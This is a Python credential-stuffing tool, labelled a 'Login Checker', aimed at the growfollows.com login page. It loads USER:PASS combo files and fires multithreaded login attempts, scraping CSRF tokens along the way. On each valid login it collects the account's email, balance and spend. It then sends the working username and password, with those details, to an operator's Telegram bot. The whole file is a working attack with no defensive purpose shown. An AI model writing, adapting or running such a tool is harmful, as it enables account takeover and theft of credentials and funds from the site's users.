import requests
import re
import threading
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.panel import Panel

console = Console()

# ===============================
# CONFIG
# ===============================
BASE_URL = "https://growfollows.com/"
ORDERS_URL = "https://growfollows.com/orders"

THREADS = int(input("Enter number of bots (threads): "))

# TELEGRAM
BOT_TOKEN = input("Enter Telegram Bot Token: ")
CHAT_ID = input("Enter Telegram Chat ID: ")

GET_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*"
}

POST_HEADERS = {
    "Host": "growfollows.com",
    "Connection": "keep-alive",
    "Cache-Control": "max-age=0",
    "Origin": "https://growfollows.com",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Referer": "https://growfollows.com/"
}

ORDERS_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*"
}

# ===============================
# COUNTERS
# ===============================
hits = 0
bad = 0
retry = 0
unknown = 0
lock = threading.Lock()

# ===============================
# FUNCTIONS
# ===============================

def extract_csrf(html):
    match = re.search(r'name="_csrf"\s+value="(.*?)"', html)
    return match.group(1) if match else None

def send_telegram(msg):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": CHAT_ID,
            "text": msg
        }
        requests.post(url, data=data, timeout=10)
    except:
        pass

def parse_orders(html):
    try:
        email = re.search(r'const point_email = "(.*?)";', html)
        balance = re.search(r'<div class="text">(.*?)</div>', html)
        spend = re.search(r'const totalspend = (.*?);', html)

        email = email.group(1) if email else "N/A"
        balance = balance.group(1) if balance else "N/A"
        spend = spend.group(1) if spend else "N/A"

        return email, balance, spend
    except:
        return "N/A", "N/A", "N/A"

def display(us, ps, status, result):
    console.print(
        Panel(
            f"[cyan]{us}:{ps}[/cyan]\nResult: {result}\nStatus Code: {status}",
            border_style="blue"
        )
    )

def update_counter(result):
    global hits, bad, retry, unknown
    with lock:
        if "HIT" in result:
            hits += 1
        elif "BAD" in result:
            bad += 1
        elif "RETRY" in result:
            retry += 1
        else:
            unknown += 1

def show_stats():
    console.print(
        f"[green]HIT: {hits}[/green] | "
        f"[red]BAD: {bad}[/red] | "
        f"[yellow]RETRY: {retry}[/yellow] | "
        f"[white]UNKNOWN: {unknown}[/white]"
    )

def send_login(combo):
    if ":" not in combo:
        return

    us, ps = combo.split(":", 1)
    session = requests.Session()

    try:
        # ===============================
        # STEP 1: GET
        # ===============================
        r1 = session.get(BASE_URL, headers=GET_HEADERS, timeout=10)

        csrf = extract_csrf(r1.text)
        if not csrf:
            update_counter("UNKNOWN")
            return

        # ===============================
        # STEP 2: POST
        # ===============================
        payload = {
            "LoginForm[username]": us,
            "LoginForm[password]": ps,
            "_csrf": csrf
        }

        r2 = session.post(
            BASE_URL,
            headers=POST_HEADERS,
            data=payload,
            timeout=10,
            allow_redirects=True
        )

        text = r2.text.lower()
        status_code = r2.status_code

        # ===============================
        # RESULT LOGIC
        # ===============================
        if status_code in [200, 302] and ("logout" in text or "dashboard" in text):
            result = "[bold green]HIT[/bold green]"

            # ===============================
            # STEP 3: GET ORDERS
            # ===============================
            r3 = session.get(ORDERS_URL, headers=ORDERS_HEADERS, timeout=10)

            email, balance, spend = parse_orders(r3.text)

            msg = f"""🔥 HIT
USER: {us}
PASS: {ps}

📧 Email: {email}
💰 Balance: {balance}
💸 Spend: {spend}

👤BY: @AB_Abde_Vm

Telegram: https://t.me/CodeWithyPython
"""
            send_telegram(msg)

        elif status_code == 401 or "incorrect username or password" in text:
            result = "[bold red]BAD[/bold red]"

        elif status_code == 429:
            result = "[bold yellow]RETRY[/bold yellow]"

        else:
            result = "[bold white]UNKNOWN[/bold white]"

        display(us, ps, status_code, result)
        update_counter(result)
        show_stats()

    except Exception:
        update_counter("RETRY")

# ===============================
# CLI
# ===============================

def main():
    console.print(Panel("[bold cyan]Login Checker CLI[/bold cyan]"))

    choice = console.input("[yellow]1) Manual Input\n2) Load from File\nChoose: [/yellow]")

    if choice == "1":
        us = console.input("Enter USER: ")
        ps = console.input("Enter PASS: ")
        send_login(f"{us}:{ps}")

    elif choice == "2":
        path = console.input("Enter combo file (USER:PASS): ")

        try:
            with open(path, "r", encoding="utf-8") as f:
                combos = [line.strip() for line in f if ":" in line]

            with ThreadPoolExecutor(max_workers=THREADS) as executor:
                executor.map(send_login, combos)

        except FileNotFoundError:
            console.print("[red]File not found![/red]")

    else:
        console.print("[red]Invalid choice![/red]")

# ===============================
# RUN
# ===============================

if __name__ == "__main__":
    main()